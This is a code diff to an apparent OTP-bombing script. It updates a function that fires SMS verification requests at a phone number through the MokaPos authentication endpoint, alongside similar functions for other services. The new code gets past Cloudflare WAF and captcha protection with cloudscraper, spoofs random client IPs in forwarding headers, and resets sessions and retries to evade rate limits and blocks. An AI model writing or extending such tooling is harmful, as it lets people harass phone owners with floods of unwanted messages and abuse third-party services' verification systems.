@@ -306,6 +306,18 @@ def _get_plb_scraper() -> cloudscraper.CloudScraper:
         )
     return _plb_scraper
 
+# ── Cloudscraper session singleton untuk MokaPos (bypass x-captcha / CF WAF)
+_mkp_scraper: cloudscraper.CloudScraper | None = None
+
+def _get_mkp_scraper() -> cloudscraper.CloudScraper:
+    """Buat atau kembalikan cloudscraper session untuk MokaPos."""
+    global _mkp_scraper
+    if _mkp_scraper is None:
+        _mkp_scraper = cloudscraper.create_scraper(
+            browser={"browser": "chrome", "platform": "android", "desktop": False}
+        )
+    return _mkp_scraper
+
 def send_planetban(phone: str) -> dict:
     num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
     pb  = "0" + num[2:]
@@ -392,24 +404,72 @@ def send_duniagames(phone: str) -> dict:
 
 
 def send_mokapos(phone: str) -> dict:
+    """Kirim OTP MokaPos — cloudscraper bypass x-captcha / CF WAF otomatis."""
     num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
     plus = "+62" + num[2:]
 
-    payload = json.dumps({"phone_number": plus})
-    hdrs = _h(
-        **{
-            "Content-Type":     "application/json",
-            "authorization":    "undefined",
-            "origin":           "https://backoffice.mokapos.com",
-            "referer":          "https://backoffice.mokapos.com/",
-            "x-requested-with": "com.chimbori.hermitcrab",
-            "sec-fetch-site":   "same-site",
-        }
-    )
-    return safe_post(
-        "https://service-goauth.mokapos.com/account/v1/verification/phone/sendc",
-        headers=hdrs, data=payload,
-    )
+    payload  = json.dumps({"phone_number": plus})
+    last_code, last_body = 0, ""
+
+    for attempt in range(3):
+        try:
+            ip   = rand_ip()
+            hdrs = {
+                "Content-Type":     "application/json",
+                "Accept":           "application/json, text/plain, */*",
+                "Accept-Language":  random.choice([
+                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "id-ID,id;q=0.9,en;q=0.8",
+                ]),
+                "authorization":    "undefined",
+                "origin":           "https://backoffice.mokapos.com",
+                "referer":          "https://backoffice.mokapos.com/",
+                "x-requested-with": "com.chimbori.hermitcrab",
+                "sec-fetch-site":   "same-site",
+                "sec-fetch-mode":   "cors",
+                "sec-fetch-dest":   "empty",
+                "X-Forwarded-For":  ip,
+                "X-Real-IP":        ip,
+                "X-Originating-IP": rand_ip(),
+            }
+
+            if attempt > 0:
+                global _mkp_scraper
+                _mkp_scraper = None   # reset session → CF token segar
+                time.sleep(random.uniform(1.5, 3.0) * attempt)
+
+            scraper = _get_mkp_scraper()
+            r = scraper.post(
+                "https://service-goauth.mokapos.com/account/v1/verification/phone/sendc",
+                headers=hdrs, data=payload, timeout=20,
+            )
+            last_code = r.status_code
+            last_body = r.text
+
+            if is_ok(r.status_code):
+                return {"status": r.status_code, "body": r.text}
+
+            if r.status_code == 429:
+                wait = float(r.headers.get("Retry-After",
+                             random.uniform(3, 7) * (attempt + 1)))
+                time.sleep(min(wait, 15))
+                continue
+
+            if r.status_code == 403:
+                # 403 → CF/captcha masih blokir → reset session
+                _mkp_scraper = None
+                time.sleep(random.uniform(2.0, 4.0))
+                continue
+
+            return {"status": r.status_code, "body": r.text}
+
+        except Exception as e:
+            last_code = 0
+            last_body = str(e)
+            _mkp_scraper = None
+            time.sleep(1.5)
+
+    return {"status": last_code, "body": last_body}
 
 
 def dispatch(method: str, phone: str) -> dict:
